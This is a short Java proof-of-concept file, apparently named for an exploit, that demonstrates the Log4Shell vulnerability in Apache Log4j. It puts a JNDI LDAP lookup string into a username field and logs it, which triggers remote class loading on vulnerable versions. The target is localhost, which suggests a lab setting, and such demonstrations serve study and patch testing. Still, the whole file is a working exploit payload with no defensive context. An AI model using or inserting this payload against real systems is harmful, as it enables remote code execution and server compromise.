import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.core.layout.PatternLayout;
import org.apache.logging.log4j.core.lookup.StrSubstitutor;
import org.apache.logging.log4j.core.net.JndiManager;
import org.apache.logging.log4j.core.pattern.MessagePatternConverter;

import java.util.function.LongFunction;

public class OriginalEXP {
    public static void main(String[] args) {
        Logger logger = LogManager.getLogger(LongFunction.class);

        String username = "${jndi:ldap://127.0.0.1:1234/ExportObject}";

        logger.error("User {} login in!", username);
    }
}
